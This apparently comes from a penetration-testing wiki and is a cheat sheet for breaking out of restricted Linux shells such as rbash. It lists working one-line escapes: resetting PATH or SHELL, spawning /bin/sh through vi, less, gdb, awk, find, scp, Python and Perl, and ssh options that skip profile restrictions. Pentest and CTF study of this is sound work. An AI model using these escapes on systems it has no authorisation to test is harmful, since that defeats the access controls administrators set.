# Escaping Restricted Shell

Some sysadmins don't want their users to have access to all commands. So they get a restriced shell. If the hacker get access to a user with a restriced shell we need to be able to break out of that, escape it, in order to have more power.

Many linux distros include rshell, which is a restriced shell.

To access the restried shell you can do this:

```
sh -r 
rsh

rbash
bash -r
bash --restricted

rksh
ksh -r
```

[http://securebean.blogspot.cl/2014/05/escaping-restricted-shell\_3.html?view=sidebar](http://securebean.blogspot.cl/2014/05/escaping-restricted-shell_3.html?view=sidebar)  
[http://pen-testing.sans.org/blog/pen-testing/2012/06/06/escaping-restricted-linux-shells](http://pen-testing.sans.org/blog/pen-testing/2012/06/06/escaping-restricted-linux-shells)

## Breaking Out

**Getting out of restricted shell**

#### Reconnaissance[¶](https://bitvijays.github.io/LFC-VulnerableMachines.html#reconnaissance)

Find out information about the environment.

* Run env to see exported environment variables
* Run ‘export -p’ to see the exported variables in the shell. This would tell which variables are read-only. Most likely the PATH \($PATH\) and SHELL \($SHELL\) variables are ‘-rx’, which means we can execute them, but not write to them. If they are writeable, we would be able to escape the restricted shell!

* If the SHELL variable is writeable, you can simply set it to your shell of choice \(i.e. sh, bash, ksh, etc…\).

* If the PATH is writeable, then you’ll be able to set it to any directory you want. I recommend setting it to one that has commands vulnerable to shell escapes.

* Try basic Unix commands and see what’s allowed ls, pwd, cd, env, set, export, vi, cp, mv etc.

#### Quick Wins

* If ‘/’ is allowed in commands just run /bin/sh

* If we can set PATH or SHELL variable

```
export PATH=/bin:/usr/bin:/sbin:$PATH
export SHELL=/bin/sh
```

or if chsh command is present just change the shell to /bin/bash

```
chsh
password: <password will be asked>
/bin/bash
```

If we can copy files into existing PATH, copy

```
cp /bin/sh /current/directory; sh
```

#### Taking help of binaries

Some commands let us execute other system commands, often bypassing shell restrictions

* ftp -&gt; !/bin/sh
* gdb -&gt; !/bin/sh
* more/ less/ man -&gt; !/bin/sh
* vi -&gt; :!/bin/sh : Refer [Breaking out of Jail : Restricted Shell](http://airnesstheman.blogspot.in/2011/05/breaking-out-of-jail-restricted-shell.html) and [Restricted Accounts and Vim Tricks in Linux and Unix](http://linuxshellaccount.blogspot.in/2008/05/restricted-accounts-and-vim-tricks-in.html)
* scp -S /tmp/getMeOut.sh x y : Refer [Breaking out of rbash using scp](http://pentestmonkey.net/blog/rbash-scp)
* awk ‘BEGIN {system\(“/bin/sh”\)}’
* find / -name someName -exec /bin/sh ;
* tee

```
echo "Your evil code" | tee script.sh
```

Invoke shell thru scripting language

Python

```
python -c 'import os; os.system("/bin/bash")'
```

Perl

```
perl -e 'exec "/bin/sh";'
```

#### SSHing from outside

* Use SSH on your machine to execute commands before the remote shell is loaded:

```
ssh username@IP -t "/bin/sh"
```

* Start the remote shell without loading “rc” profile \( where most of the limitations are often configured\)

```
ssh username@IP -t "bash --noprofile"
```



